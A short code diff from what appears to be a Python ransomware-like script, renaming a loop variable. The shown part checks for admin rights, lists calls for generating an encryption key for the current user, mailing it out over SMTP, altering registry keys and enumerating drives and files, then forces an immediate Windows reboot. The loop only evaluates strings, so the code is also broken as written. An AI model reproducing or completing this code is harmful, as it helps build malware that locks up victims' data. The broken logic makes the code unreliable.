@@ -26,8 +26,8 @@ if(get_admin_rights.is_admin()):
         my_list = ['crypt.genkey(current_user)', 'crypt.random_id()', 'sendkey_smtp.send_key()', 'gt.proc()', 'gr.proc()', 'dk.smart()', \ 
                    'dr.stsk()', 'rkey.setkey()', 'rkey.delkey()', 'rkey.setInit()', 'gt.dir()', 'gr.dir()', 'crypt.drives_aux()', 'crypt.filelist()', \
                      'dk.exp()', 'dr.exp()']
-        for x in my_list:
-            x
+        for my_function in my_list:
+            my_function
         # REBOOT WINDOWS
         os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")
 else:
